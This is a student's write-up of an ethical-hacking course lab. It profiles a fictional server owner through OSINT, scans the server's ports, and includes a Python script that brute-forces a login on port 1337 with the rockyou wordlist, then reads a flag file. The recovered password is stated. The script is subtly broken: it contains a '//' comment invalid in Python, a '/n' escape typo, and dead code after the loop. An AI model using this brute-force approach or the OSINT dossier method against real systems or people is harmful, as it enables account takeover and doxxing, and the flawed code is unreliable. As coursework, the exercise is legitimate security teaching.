# OSINT + Vulnerability-Scanning
An assignment for my Introduction to Ethical Hacking course at UMD, CMSC 389R.

## Assignment Details

This assignment is broken up into three parts, and involves gaining as much intel on a certain server and then to scan for vulnerabilities 
and ultimately access the server in order to find a flag, or indicator that we had succesfully penetrated the server.


### Part 1

Answer the following questions pertaining to the Briong server.

    1) What is the IP address of the server? How did you discover this?
    
I found this by the IP address of the server by looking for intel regarding 'briong70', this led me to the Twitter of a certain Mark Thompson,
on this twitter page I found a username, 'mnthomp22', that I decided to look into more, this led me to the github page of Mark Thompson, where when
looking at the lates commmits, I came across the IP address where his website was located. The IP address is: 129.2.94.135.

    2) Which operating system is the server probably running? How did you discover this?
 
 The server is running a linux Ubuntu operating system, I discovered this using shodan.io.

    3) Where is the server located? How did you discover this?

Using whois I found that the server is owned by and located in the University of Maryland. 

    4) Who (person's full name) owns the Briong server? How did you discover this?

The owner of the Briong server's full name is Mark Thompson, I found this in multiple social media sites and in github.

    5) List as much personal information found about the owner of Briong. For each, briefly detail how you discovered them.
    
Name: Mark Thompson (Found on Mark's Twitter).

Username: mnthomp22 (Found on Mark's Twitter).

Email: mnthomp22@tuta.io (Found on Mark's github).

Phone: 555-555-5555 (Found on Marks's github).

Address: 1234 Secure Road, New York, New York(Found on Mark's github).

Interested In: Oprah, National Geographic, Who is Mr. Robot, Amazon, Hacking (Found on Mark's Instagram).

Relationships: Apparently has sister or wife by the name of Gina Thompson, who also works at Briong Industries (Found on Mark's Facebook).

    6) What ports are open on the Briong server? How did you discover this?
    
Ports 80, 5000, 1337
I found this by running an nmap scan on all ports on the briong IP address.

    7) What is the domain name associated with the found IP address? How did you discover this?
    
The domain is: http://irc.csec.umd.edu/
I found this using shodan.io, it came up while I was attempting to obtain information on the servers operating system.

    8) What services are running on the server?

The services running on this server are: HTTP on port 80 and SSH on port 22, another service is open on port 1337, but not quite sure what it is.

    9) List all hidden files you have discovered on the website. For each, briefly detail how you discovered them.

There was a secret folder called 'secret' that I found by looking up http://129.2.94.135/robots.txt to attempt to discover which files were blocked from search engines. 
There I found the secret folder, and in the folder was a file flag.txt with the flag for this first part of the assignment:

Good - nice find!CMSC389R-{r0b0ts_t00k_m3_h3r3}

    10) What is an SSH fingerprint? What is the SSH fingerprint of the Briong server? How did you discover this?
SSH Fingerprints are used to allow the client to authenticate the server, if the server fails the authenticationg process there is 
a chance someone is carrying out a spoofing or man-in-the-middle attack and the client could be connnecting to a malicious server.

The fingerprint is:```7a:54:c8:c3:98:62:5f:c8:fb:23:5c:fc:3f:ea:6e:33```

I found this by attempting to SSH into the briong server and using ```ssh -o FingerprintHash=md5 129.2.94.135```


### Part 2

The next part of this assignment involved gaining access to the briong server and finding a certain flag in one of the files.

I did this by using the python script below to connect to the server and iterating through a wordlist from the myspace era to try every password until I gained access.

I was fairly sure I knew what the username would be from the first part of this assignment, searching for briong I came across the username ```mnthomp22 ``` quite often relating
to Mark Thompson, the owner of the server.

After running a full nmap scan I was able to find all open ports, among them was one curious one, ```port 1337```, which I found out was a port I could use inoder to gain access to the briong server.

```
import socket

host = "129.2.94.135" # IP address here
port = 1337 # Port here
wordlist = "/usr/share/wordlists/rockyou.txt" # Point to wordlist file

def brute_force():
    
        #Sockets: https://docs.python.org/2/library/socket.html
        #How to use the socket s:
       
    file = open("rockyou.txt", "r")



    for line in file.readlines():
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.connect((host, port))
   

        print("trying Password: " + line)
        
        # username:
        data = s.recv(1024)
        s.send("mnthomp22\n")

        # password:
        data = s.recv(1024)

        # send in password
        s.send(line)
        
        # Can uncomment line below and comment line above to bypass the iteration through wordlist.
        //s.send("blink182/n")
        
        
        data = s.recv(1024)
        print(data)

        if "Fail" not in data:
            print(line)
            break

        s.close()

    #flag is in flag.txt file.
    s.send("cat /home/flag.txt\n")
    data = s.recv(1024)
    print(data)



    username = "mnthomp22"   # The username for the briong server
    password = "blink182"   # The password for the briong server, can use inorder to bypass iteration through wordlist.




if __name__ == '__main__':
    brute_force()
```

After running this file, the flag is revealed to us as: ```Good! Here's your flag: CMSC389R-{vu1n_sc4n_t0_pwn}```

### Part 3

The OSINT Technique I find most fascinating is port scanning. Using CLI tools like nmap, we are able to scan all ports on a machine to uncover vulnerabilities, discover all services a server is running, discover the type of firewall that is bieng used, or to do a quick inventory of a local network. This is incredibly useful when trying to gain intel and learn about potential vulnerabilities of a target machine. In terms of OPSEC, after locating these port and service vulnerabilites we are able to close or monitor ports that could be used by a potential attacker, it is the best tool for penetration detection, and if you are able to penetrate a server or machine, it is highly likely that attackers can as well!
